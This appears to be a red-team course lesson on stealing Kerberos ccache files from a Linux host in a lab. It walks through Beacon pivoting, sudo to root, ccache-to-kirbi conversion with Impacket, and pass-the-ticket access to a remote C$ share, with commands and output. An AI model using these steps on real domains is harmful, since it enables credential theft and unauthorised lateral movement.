Kerberos Credential Cache (ccache) files hold the Kerberos credentials for a user authenticated to a domain-joined Linux machine, often a cached TGT. If you compromise such a machine, you can extract the ccache of any authenticated user and use it to request service tickets (TGSs) for any other service in the domain.

Access the console of WKSTN-2 and use **PuTTY** to ssh into nix-1 as jking. Then use your foothold Beacon to ssh into nix-1 as a member of the Oracle Admins group, from your attacking machine.

```
root@kali:~# proxychains ssh svc_oracle@10.10.17.12
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.17.12:22-<><>-OK
svc_oracle@10.10.17.12's password:
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-1037-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Mar  9 15:34:17 UTC 2021

  System load:  0.0               Processes:             114
  Usage of /:   22.6% of 7.69GB   Users logged in:       1
  Memory usage: 50%               IPv4 address for eth0: 10.10.17.12
  Swap usage:   0%


0 updates can be installed immediately.
0 of these updates are security updates.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


svc_oracle@nix-1:~$
```

  
> Beacon also has a built-in ssh client, but using a fully-fledged client through a pivot may be more convenient.  
```
beacon> ssh 10.10.17.12:22 svc_oracle Passw0rd!
[+] established link to child session: 10.10.17.12
```
  

The ccache files are stored in `/tmp` and are prefixed with `krb5cc`.

```
svc_oracle@nix-1:~$ ls -l /tmp/
total 20
-rw------- 1 jking      domain users 1342 Mar  9 15:21 krb5cc_1394201122_MerMmG
-rw------- 1 svc_oracle domain users 1341 Mar  9 15:33 krb5cc_1394201127_NkktoD
```

  

We can see by the permission column that only the user and root can access them - so for this to be a useful primitive, root access is required. In this case, `svc_oracle` has sudo privileges.

```
svc_oracle@nix-1:~$ sudo -l
[sudo] password for svc_oracle:
Matching Defaults entries for svc_oracle on nix-1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_oracle may run the following commands on nix-1:
    (ALL) ALL

svc_oracle@nix-1:~$ sudo -i
root@nix-1:~#
```

  

  
Use this access to download `krb5cc_1394201122_MerMmG` to your Kali VM.

>  Cobalt Strike has a `kerberos_ccache_use` command, but it does not seem to recognise this particular ccache format.  
```
beacon> kerberos_ccache_use C:\Users\Administrator\Desktop\krb5cc_1394201122_MerMmG
[-] Could not extract ticket from C:\Users\Administrator\Desktop\krb5cc_1394201122_MerMmG
```

Instead, we can use **Impacket** to convert this ticket from **ccache** to **kirbi** format.

```
root@kali:~# impacket-ticketConverter krb5cc_1394201122_MerMmG jking.kirbi
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] converting ccache to kirbi...
[+] done
```  

Now we can use this kirbi with a sacrificial logon session.

beacon> make_token DEV\jking FakePass
[+] Impersonated DEV\bfarmer

```
beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\jking.kirbi

beacon> ls \\srv-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     12/13/2017 21:00:56   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     02/23/2021 17:08:43   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/17/2021 18:28:36   System Volume Information
          dir     03/09/2021 12:32:56   Users
          dir     02/17/2021 18:28:54   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 256mb    fil     03/09/2021 12:30:35   pagefile.sys
```
